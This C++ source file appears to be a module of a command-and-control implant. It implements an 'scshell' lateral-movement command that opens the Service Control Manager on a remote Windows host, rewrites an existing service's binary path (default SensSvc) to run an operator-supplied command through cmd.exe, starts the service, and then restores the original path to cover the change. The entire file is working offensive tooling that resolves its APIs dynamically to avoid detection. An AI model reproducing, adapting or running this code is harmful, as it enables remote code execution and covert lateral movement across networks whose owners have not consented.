#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_JUMP_SCSHELL

using namespace stardust;
using namespace starburst;

typedef SC_HANDLE (WINAPI *fnOpenSCManagerW)( LPCWSTR, LPCWSTR, DWORD );
typedef SC_HANDLE (WINAPI *fnOpenServiceW)( SC_HANDLE, LPCWSTR, DWORD );
typedef BOOL (WINAPI *fnChangeServiceConfigW)( SC_HANDLE, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR );
typedef BOOL (WINAPI *fnStartServiceW)( SC_HANDLE, DWORD, LPCWSTR* );
typedef BOOL (WINAPI *fnQueryServiceStatusEx)( SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD );
typedef BOOL (WINAPI *fnCloseServiceHandle)( SC_HANDLE );
typedef BOOL (WINAPI *fnQueryServiceConfigW)( SC_HANDLE, LPQUERY_SERVICE_CONFIGW, DWORD, LPDWORD );

auto declfn starburst::cmd_jump_scshell(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );
    if ( !host_str || host_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no hostname provided" ) ) );
        return;
    }

    uint32_t svc_name_len = 0;
    auto svc_name = parser_string( params, &svc_name_len );

    uint32_t command_len = 0;
    auto command_str = parser_string( params, &command_len );
    if ( !command_str || command_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
        return;
    }

    HMODULE h_advapi = inst.kernel32.LoadLibraryA(
        symbol<char*>( const_cast<char*>( "advapi32.dll" ) ) );
    if ( !h_advapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load advapi32" ) ) );
        return;
    }

    auto pOpenSCManagerW = reinterpret_cast<fnOpenSCManagerW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "OpenSCManagerW" ) ) ) );
    auto pOpenServiceW = reinterpret_cast<fnOpenServiceW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "OpenServiceW" ) ) ) );
    auto pChangeServiceConfigW = reinterpret_cast<fnChangeServiceConfigW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "ChangeServiceConfigW" ) ) ) );
    auto pStartServiceW = reinterpret_cast<fnStartServiceW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "StartServiceW" ) ) ) );
    auto pQueryServiceConfigW = reinterpret_cast<fnQueryServiceConfigW>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "QueryServiceConfigW" ) ) ) );
    auto pCloseServiceHandle = reinterpret_cast<fnCloseServiceHandle>(
        inst.kernel32.GetProcAddress( h_advapi,
            symbol<char*>( const_cast<char*>( "CloseServiceHandle" ) ) ) );

    if ( !pOpenSCManagerW || !pOpenServiceW || !pChangeServiceConfigW ||
         !pStartServiceW || !pQueryServiceConfigW || !pCloseServiceHandle ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to resolve SC APIs" ) ) );
        return;
    }

    wchar_t w_host[256] = {};
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_str, host_len, w_host, 255 );

    wchar_t w_svc[128] = {};
    if ( svc_name && svc_name_len > 0 ) {
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, svc_name, svc_name_len, w_svc, 127 );
    } else {
        wchar_t def[] = { 'S','e','n','s','S','v','c', 0 };
        for ( int i = 0; i < 8; i++ ) w_svc[i] = def[i];
    }

    wchar_t unc_host[270] = { '\\', '\\', 0 };
    for ( int i = 0; i < 256 && w_host[i]; i++ )
        unc_host[i + 2] = w_host[i];

    SC_HANDLE h_scm = pOpenSCManagerW( unc_host, nullptr,
        SC_MANAGER_CONNECT );
    if ( !h_scm ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenSCManager failed" ) ) );
        return;
    }

    SC_HANDLE h_svc = pOpenServiceW( h_scm, w_svc,
        SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_QUERY_CONFIG | SERVICE_STOP );
    if ( !h_svc ) {
        pCloseServiceHandle( h_scm );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenService failed - service may not exist" ) ) );
        return;
    }

    // save original binary path
    DWORD bytes_needed = 0;
    pQueryServiceConfigW( h_svc, nullptr, 0, &bytes_needed );
    auto* orig_config = static_cast<QUERY_SERVICE_CONFIGW*>( inst.heap_alloc( bytes_needed ) );
    wchar_t orig_bin_path[512] = {};

    if ( orig_config && pQueryServiceConfigW( h_svc, orig_config, bytes_needed, &bytes_needed ) ) {
        if ( orig_config->lpBinaryPathName ) {
            for ( int i = 0; i < 511 && orig_config->lpBinaryPathName[i]; i++ )
                orig_bin_path[i] = orig_config->lpBinaryPathName[i];
        }
    }
    if ( orig_config ) inst.heap_free( orig_config );

    // build command: %COMSPEC% /c <command>
    wchar_t w_cmd[1024] = {};
    wchar_t prefix[] = { '%','C','O','M','S','P','E','C','%',' ','/','c',' ', 0 };
    int idx = 0;
    for ( ; prefix[idx]; idx++ ) w_cmd[idx] = prefix[idx];
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_cmd + idx, 1024 - idx - 1 );

    // change service binary to our command
    BOOL changed = pChangeServiceConfigW(
        h_svc,
        SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_NO_CHANGE,
        w_cmd,
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if ( !changed ) {
        pCloseServiceHandle( h_svc );
        pCloseServiceHandle( h_scm );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "ChangeServiceConfig failed" ) ) );
        return;
    }

    // start service (will likely fail since our cmd isn't a real service)
    pStartServiceW( h_svc, 0, nullptr );

    // restore original binary path
    if ( orig_bin_path[0] ) {
        pChangeServiceConfigW(
            h_svc,
            SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            orig_bin_path,
            nullptr, nullptr, nullptr, nullptr, nullptr, nullptr
        );
    }

    pCloseServiceHandle( h_svc );
    pCloseServiceHandle( h_scm );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS,
        symbol<char*>( const_cast<char*>( "command executed via service config modification" ) ) );
}

#endif
